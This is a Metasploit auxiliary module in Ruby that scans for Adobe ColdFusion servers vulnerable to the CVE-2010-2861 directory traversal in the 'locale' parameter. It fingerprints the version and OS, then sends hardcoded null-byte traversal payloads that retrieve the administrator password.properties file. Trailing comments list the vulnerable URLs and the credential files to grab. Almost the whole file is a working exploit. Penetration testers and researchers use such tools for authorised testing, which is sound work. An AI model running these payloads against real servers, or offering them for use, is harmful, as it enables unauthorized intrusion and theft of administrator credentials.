##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'ColdFusion Server Check',
			'Description' => %q{
					This module attempts to exploit the directory traversal in the 'locale'
				attribute.  According to the advisory the following versions are vulnerable:

				ColdFusion MX6 6.1 base patches,
				ColdFusion MX7 7,0,0,91690 base patches,
				ColdFusion MX8 8,0,1,195765 base patches,
				ColdFusion MX8 8,0,1,195765 with Hotfix4.

				Adobe released patches for ColdFusion 8.0, 8.0.1, and 9 but ColdFusion 9 is reported
				to have directory traversal protections in place, subsequently this module does NOT
				work against ColdFusion 9.  Adobe did not release patches for ColdFusion 6.1 or
				ColdFusion 7.

				It is not recommended to set FILE when doing scans across a group of servers where the OS
				may vary; otherwise, the file requested may not make sense for the OS

			},
			'Author'      => [ 'CG', 'nebulus' ],
			'License'     => MSF_LICENSE,
			'References'  =>
				[
					[ 'CVE', '2010-2861' ],
					[ 'BID', '42342' ],
					[ 'OSVDB', '67047' ],
					[ 'URL', 'http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr10-07' ],
					[ 'URL', 'http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861' ],
					[ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb10-18.html' ],
				]
		)

		register_options(
			[
				OptString.new('FILE', [ false,  'File to retrieve', '']),
				OptBool.new('FINGERPRINT', [true, 'Only fingerprint endpoints', false])
			], self.class)
	end

	def fingerprint(response)

		if(response.headers.has_key?('Server') )
			if(response.headers['Server'] =~ /IIS/ or response.headers['Server'] =~ /\(Windows/)
				os = "Windows (#{response.headers['Server']})"
			elsif(response.headers['Server'] =~ /Apache\//)
					os = "Unix (#{response.headers['Server']})"
			else
				os = response.headers['Server']
			end
		end

		return nil if response.body.length < 100

		title = "Not Found"
		response.body.gsub!(/[\r\n]/, '')
		if(response.body =~ /<title.*\/?>(.+)<\/title\/?>/i)
			title = $1
			title.gsub!(/\s/, '')
		end
		return nil  if( title == 'Not Found' or not title =~ /ColdFusionAdministrator/)

		out = nil

		if(response.body =~ />\s*Version:\s*(.*)<\/strong\><br\s\//)
			v = $1
			out = (v =~ /^6/) ? "Adobe ColdFusion MX6 #{v}" : "Adobe ColdFusion MX7 #{v}"
		elsif(response.body =~ /<meta name=\"Author\" content=\"Copyright 1995-2012 Adobe/ and response.body =~ /Administrator requires a browser that supports frames/ )
			out = "Adobe ColdFusion MX7"
		elsif(response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995-2006 Adobe/)
			out = "Adobe ColdFusion 8"
		elsif(response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995-2010 Adobe/ or
			response.body =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995\-2009 Adobe Systems\, Inc\. All rights reserved/)
			out = "Adobe ColdFusion 9"
		elsif(response.body =~ /<meta name=\"Keywords\" content=\"(.*)\">\s+<meta name/)
			out = $1.split(/,/)[0]
		else
			out = 'Unknown ColdFusion'
		end

		if(title.downcase == 'coldfusionadministrator')
			out << " (administrator access)"
		end

		out << " (#{os})"
		return out
	end

	def run_host(ip)
		trav = datastore['FILE']

		if(trav == '' or datastore['FINGERPINT'])
		# the user did not specify what they wanted, fingerprint, go after password.properties

			url = '/CFIDE/administrator/index.cfm'

			res = send_request_cgi({
					'uri' => url,
					'method' => 'GET',
					'Connection' => "keep-alive",
					'Accept-Encoding' => "zip,deflate",
					})

			return if not res or not res.body or not res.code

			if (res.code.to_i == 200)
				out = fingerprint(res)
				print_status("#{ip} #{out}") if out
				return if (datastore['FINGERPRINT'])

				if(out =~ /Windows/ and out =~ /MX6/)
					trav = '..\..\..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en'
				elsif(out =~ /Windows/ and out =~ /MX7/)
					trav = '..\..\..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en'
				elsif(out =~ /Windows/ and out =~ /ColdFusion 8/)
					trav = '..\..\..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en'
				elsif(out =~ /ColdFusion 9/)
					print_status("#{ip} ColdFusion 9 is not vulnerable, skipping")
					return
				elsif(out =~ /Unix/ and out =~ /MX6/)
					trav = '../../../../../../../../../../opt/coldfusionmx/lib/password.properties%00en'
				elsif(out =~ /Unix/ and out =~ /MX7/)
					trav = '../../../../../../../../../../opt/coldfusionmx7/lib/password.properties%00en'
				elsif(out =~ /Unix/ and out =~ /ColdFusion 8/)
					trav = '../../../../../../../../../../opt/coldfusion8/lib/password.properties%00en'
				else
					if(res.body =~ /Adobe/ and res.body =~ /ColdFusion/)
						print_error("#{ip} Fingerprint failed, FILE not set...aborting")
					else
						return		# probably just a web server
					end
				end
			else
				return 				# silent fail as it doesnt necessarily at this point have to be a CF server
			end
		end

		# file specified or obtained via fingerprint
		if(trav !~ /\.\.\/\.\.\// and trav !~ /\.\.\\\.\.\\/)
			# file probably specified by user, make sure to add in actual traversal
			trav = '../../../../../../../../../../' << trav << '%00en'
		end

		locale = "?locale="

		urls = ["/CFIDE/administrator/enter.cfm", "/CFIDE/wizards/common/_logintowizard.cfm", "/CFIDE/administrator/archives/index.cfm",
			"/CFIDE/administrator/entman/index.cfm", "/CFIDE/administrator/logging/settings.cfm"]
		# "/CFIDE/install.cfm",  haven't seen where this one works

		out = ''							# to keep output in synch with threads
		urls.each do |url|
			res = send_request_raw({
				'uri'     => url+locale+trav,
				'method'  => 'GET',
				'headers' =>
					{
						'Connection' => "keep-alive",
						'Accept-Encoding' => "zip,deflate",
					},
				})


			if (res.nil?)
				print_error("no response for #{ip}:#{rport} #{url}")
			elsif (res.code == 200)
				#print_error("#{res.body}")#debug
				print_status("URL: #{ip}#{url}#{locale}#{trav}")
				if res.body.match(/\<title\>(.*)\<\/title\>/im)
					fileout = $1
					if(fileout !~ /Login$/ and fileout !~ /^Welcome to ColdFusion/ and fileout !~ /^Archives and Deployment/)
						print_good("#{ip} FILE: #{fileout}")
						break
					end
				end
			else
				next if (res.code == 500 or res.code == 404 or res.code == 302)
				print_error("#{ip} #{res.inspect}")
			end
		end

	rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::ArgumentError
	rescue ::Timeout::Error, ::Errno::EPIPE
	end

end

#URL's that may work for you:
#"/CFIDE/administrator/enter.cfm",
#"/CFIDE/wizards/common/_logintowizard.cfm",
#"/CFIDE/administrator/archives/index.cfm",
#"/CFIDE/install.cfm",
#"/CFIDE/administrator/entman/index.cfm",
#"/CFIDE/administrator/logging/settings.cfm",

#Files to grab
#../../../../../../../../../../ColdFusion8/lib/password.properties%00en
#../../../../../../../../../../CFusionMX7/lib/password.properties%00en
#../../../../../../../../../../opt/coldfusionmx7/lib/password.properties%00en
